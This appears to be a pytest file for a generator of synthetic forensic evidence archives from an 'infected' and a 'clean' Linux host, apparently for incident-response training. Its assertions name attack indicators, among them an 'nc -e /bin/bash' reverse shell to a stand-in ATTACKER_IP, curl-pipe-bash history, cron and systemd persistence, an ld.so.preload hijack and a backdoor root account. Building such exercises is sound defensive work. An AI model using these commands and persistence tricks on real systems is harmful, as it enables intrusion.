import hashlib
import json
import tarfile
from datetime import datetime
from pathlib import Path

from conftest import load_generate


def read_manifest(archive):
    with tarfile.open(archive, "r:gz") as tar:
        handle = tar.extractfile("manifest.json")
        assert handle is not None
        return json.loads(handle.read().decode("utf-8"))


def member_bytes(archive, name):
    with tarfile.open(archive, "r:gz") as tar:
        handle = tar.extractfile(name)
        assert handle is not None, name
        return handle.read()


def evidence_text(archive, original_path):
    return member_bytes(archive, "evidence/" + original_path.lstrip("/")).decode("utf-8", "replace")


def verify_archive(archive):
    manifest = read_manifest(archive)
    checked = 0
    with tarfile.open(archive, "r:gz") as tar:
        for rec in manifest["files"]:
            if not rec.get("sha256"):
                continue
            assert rec.get("archive_path"), rec["original_path"]
            handle = tar.extractfile(rec["archive_path"])
            assert handle is not None, rec["archive_path"]
            assert hashlib.sha256(handle.read()).hexdigest() == rec["sha256"], rec["original_path"]
            checked += 1
        for rec in manifest["live_commands"]:
            if not rec.get("sha256"):
                continue
            handle = tar.extractfile(rec["archive_path"])
            assert handle is not None, rec["archive_path"]
            assert hashlib.sha256(handle.read()).hexdigest() == rec["sha256"], rec["name"]
            checked += 1
        for rec in manifest["triage"]:
            handle = tar.extractfile(rec["archive_path"])
            assert handle is not None, rec["archive_path"]
            assert hashlib.sha256(handle.read()).hexdigest() == rec["sha256"], rec["name"]
            checked += 1
        log_info = manifest["collect_log"]
        handle = tar.extractfile(log_info["archive_path"])
        assert handle is not None
        assert hashlib.sha256(handle.read()).hexdigest() == log_info["sha256"]
    sidecar = Path(str(archive) + ".sha256")
    assert sidecar.is_file()
    assert sidecar.read_text(encoding="ascii").split()[0] == hashlib.sha256(Path(archive).read_bytes()).hexdigest()
    return manifest, checked


def test_infected_archive_verifies(generated):
    archive = generated["results"]["infected"]["archive"]
    manifest, checked = verify_archive(archive)
    assert checked == manifest["counts"]["hashed_entries"]
    assert checked > 40
    assert manifest["generator"]["seed"] == 1337
    assert manifest["generator"]["host_profile"] == "infected"


def test_clean_archive_verifies(generated):
    archive = generated["results"]["clean"]["archive"]
    manifest, checked = verify_archive(archive)
    assert checked == manifest["counts"]["hashed_entries"]
    assert checked > 30
    assert manifest["generator"]["host_profile"] == "clean"


def test_manifest_timezone_and_collection_time(generated):
    gen = generated["gen"]
    for profile in ("infected", "clean"):
        manifest = read_manifest(generated["results"][profile]["archive"])
        assert manifest["timezone"]["name"] == "Africa/Cairo"
        assert manifest["timezone"]["utc_offset_seconds"] == 7200
        assert manifest["timezone"]["utc_offset_str"] == "+0200"
        assert manifest["collection_time_utc"] == gen.FIXED_COLLECTION_UTC


def test_infected_ssh_bruteforce_then_success(generated):
    gen = generated["gen"]
    archive = generated["results"]["infected"]["archive"]
    auth = evidence_text(archive, "/var/log/auth.log")
    failed = [line for line in auth.splitlines() if "Failed password" in line and gen.ATTACKER_IP in line]
    assert len(failed) >= 40
    assert any(
        f"Accepted password for root from {gen.ATTACKER_IP}" in line for line in auth.splitlines()
    )
    assert any("sudo:" in line and "COMMAND=/bin/bash" in line for line in auth.splitlines())


def test_infected_suspicious_history(generated):
    archive = generated["results"]["infected"]["archive"]
    history = evidence_text(archive, "/home/alice/.bash_history")
    for marker in ("curl", "| bash", "wget", "chmod +x /tmp", "nc -e", "base64 -d"):
        assert marker in history, marker


def test_infected_persistence(generated):
    archive = generated["results"]["infected"]["archive"]
    assert "/tmp/.x/run.sh" in evidence_text(archive, "/etc/cron.d/evil")
    assert "/tmp/.x/run.sh" in member_bytes(archive, "live/crontab_root.txt").decode()
    service = evidence_text(archive, "/etc/systemd/system/system-update.service")
    assert "ExecStart=/dev/shm/.cache/upd" in service
    assert evidence_text(archive, "/etc/ld.so.preload").strip() == "/tmp/.lib/libc.so.6"
    dev_shm = member_bytes(archive, "triage/dev_shm_listing.txt").decode()
    assert "/dev/shm/.cache/upd" in dev_shm


def test_infected_account_changes(generated):
    gen = generated["gen"]
    archive = generated["results"]["infected"]["archive"]
    passwd = evidence_text(archive, "/etc/passwd")
    uid0 = [line for line in passwd.splitlines() if line.split(":")[2] == "0"]
    assert any(line.startswith("sysbackup:") for line in uid0)
    assert "sysbackup" in evidence_text(archive, "/etc/sudoers.d/99-backup")
    keys = evidence_text(archive, "/root/.ssh/authorized_keys").splitlines()
    assert len([line for line in keys if line.strip()]) == 2
    assert any("attacker@evil" in line for line in keys)
    assert gen.ATTACKER_IP.encode() in member_bytes(archive, "evidence/var/log/wtmp")
    btmp = member_bytes(archive, "evidence/var/log/btmp")
    assert len(btmp) > 0 and len(btmp) % gen.UTMP_SIZE == 0
    lastlog = member_bytes(archive, "evidence/var/log/lastlog")
    assert len(lastlog) == 4 * gen.LASTLOG_SIZE
    assert gen.ATTACKER_IP.encode() in lastlog


def test_infected_timestomp_indicator(generated):
    archive = generated["results"]["infected"]["archive"]
    recent = member_bytes(archive, "triage/recent_files.txt").decode().splitlines()[1:]
    rows = [row.split("\t") for row in recent if row.split("\t")[0].endswith("/payload")]
    assert rows, "expected timestomped payload in recent_files"
    mtime = datetime.strptime(rows[0][6], "%Y-%m-%dT%H:%M:%SZ")
    ctime = datetime.strptime(rows[0][7], "%Y-%m-%dT%H:%M:%SZ")
    assert (ctime - mtime).total_seconds() > 86400


def test_infected_year_boundary_syslog(generated):
    archive = generated["results"]["infected"]["archive"]
    syslog = evidence_text(archive, "/var/log/syslog")
    assert any(line.startswith("Dec 31 ") for line in syslog.splitlines())
    assert any(line.startswith("Jan  1 ") for line in syslog.splitlines())
    journal = member_bytes(archive, "live/journalctl_export.txt").decode()
    assert "2025-12-31T" in journal and "2026-01-01T" in journal


def test_infected_live_state_shows_attacker(generated):
    gen = generated["gen"]
    archive = generated["results"]["infected"]["archive"]
    ps = member_bytes(archive, "live/ps_auxf.txt").decode()
    assert "/tmp/.x/x" in ps and f"nc -e /bin/bash {gen.ATTACKER_IP} 4444" in ps
    ss = member_bytes(archive, "live/ss_tulpn.txt").decode()
    assert f"{gen.ATTACKER_IP}:4444" in ss
    last = member_bytes(archive, "live/last.txt").decode()
    assert gen.ATTACKER_IP in last


def test_clean_has_no_attack_markers(generated):
    gen = generated["gen"]
    archive = generated["results"]["clean"]["archive"]
    manifest = read_manifest(archive)
    by_path = {rec["original_path"]: rec for rec in manifest["files"]}
    auth = evidence_text(archive, "/var/log/auth.log")
    assert gen.ATTACKER_IP not in auth
    assert sum(1 for line in auth.splitlines() if "Failed password" in line) <= 2
    history = evidence_text(archive, "/home/alice/.bash_history")
    for marker in ("curl", "wget", "nc -e", "base64 -d", "| bash"):
        assert marker not in history, marker
    assert by_path["/etc/ld.so.preload"]["status"] == "not_present"
    assert by_path["/etc/sudoers.d/*"]["status"] == "not_present"
    assert "/etc/systemd/system/system-update.service" not in by_path
    assert "/etc/cron.d/evil" not in by_path
    assert by_path["/var/log/audit/audit.log*"]["status"] == "not_present"
    passwd = evidence_text(archive, "/etc/passwd")
    assert "sysbackup" not in passwd
    assert len(passwd.splitlines()) == 4
    keys = [line for line in evidence_text(archive, "/root/.ssh/authorized_keys").splitlines() if line.strip()]
    assert len(keys) == 1
    dev_shm = member_bytes(archive, "triage/dev_shm_listing.txt").decode()
    assert "upd" not in dev_shm and ".cache" not in dev_shm
    for live_name in ("ps_auxf", "ss_tulpn", "lsof_nP", "last"):
        content = member_bytes(archive, f"live/{live_name}.txt").decode()
        assert gen.ATTACKER_IP not in content, live_name
        assert "/tmp/.x" not in content, live_name
    assert member_bytes(archive, "evidence/var/log/btmp") == b""


def test_generation_is_deterministic(generated, tmp_path):
    gen = generated["gen"]

    def scenario_bytes(archive):
        with tarfile.open(archive, "r:gz") as tar:
            return {
                member.name: tar.extractfile(member).read()
                for member in tar.getmembers()
                if member.isfile() and (member.name.startswith("evidence/") or member.name.startswith("live/"))
            }

    first = generated["results"]["infected"]["archive"]
    second_out = tmp_path / "regen"
    second = gen.generate_all(str(second_out), seed=1337)["infected"]["archive"]
    assert scenario_bytes(first) == scenario_bytes(second)


def test_infected_has_masked_auditd_unit(generated):
    gen = generated["gen"]
    archive = generated["results"]["infected"]["archive"]
    manifest = read_manifest(archive)
    by_path = {rec["original_path"]: rec for rec in manifest["files"]}
    rec = by_path[gen.MASKED_UNIT_PATH]
    assert rec["status"] == "ok"
    assert rec["type"] == "symlink"
    assert rec["archive_path"] is None
    assert rec["sha256"] is None
    assert rec["symlink_target"] == "/dev/null"
    assert rec["masked"] is True
    assert all(item["original_path"] != gen.MASKED_UNIT_PATH for item in manifest["skipped"])
    with tarfile.open(archive, "r:gz") as tar:
        assert ("evidence" + gen.MASKED_UNIT_PATH) not in set(tar.getnames())


def test_clean_has_no_masked_units(generated):
    gen = generated["gen"]
    archive = generated["results"]["clean"]["archive"]
    manifest = read_manifest(archive)
    assert gen.MASKED_UNIT_PATH not in {rec["original_path"] for rec in manifest["files"]}
    assert not [rec for rec in manifest["files"] if rec.get("masked")]


def test_generate_cli(tmp_path):
    gen = load_generate()
    out = tmp_path / "cli-out"
    assert gen.main(["--out", str(out), "--seed", "1337", "--hosts", "infected"]) == 0
    assert (out / "infected" / "evidence.tar.gz").is_file()
    assert (out / "infected" / "evidence.tar.gz.sha256").is_file()
    assert not (out / "clean").exists()
